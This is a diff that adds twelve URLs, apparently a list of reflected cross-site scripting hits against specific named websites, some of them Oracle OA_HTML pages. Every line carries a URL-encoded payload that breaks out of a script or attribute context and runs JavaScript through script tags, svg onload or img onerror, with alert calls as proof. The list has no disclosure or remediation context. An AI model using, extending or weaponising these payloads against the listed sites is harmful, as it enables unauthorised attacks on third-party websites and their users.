@@ -1,0 +1,12 @@
+http://rwski.com/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://rwtv.com/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://rwxdt.38atp.com/ie50/system/login/SysLoginUser.aspx?Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Login=Error
+http://rx15.com/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+http://ryanbuskirk.serviceteam.com/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('2RREfEDecGFj8msKFUD2nWTJIZ9')%3E
+http://ryancahn.com/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://ryan.eastcoasttires.com/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://ryan-eng.com/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('2RRPDxm41WsMsjc6PXes5hduYQz')%3E
+http://ryanfamilyrecipes.com/passport/index.php?action=manage&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mtype=userset
+http://ryangwilliams.com/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://ryangwinnerpress.com/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('2RRXn8O5thdvviFq35WhzafMKSB')%3E
+http://ryanhercoflowsolutions.com/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('2RRYqzAjR1JLfBvMs4rQ2ldQ9Wh')%3E
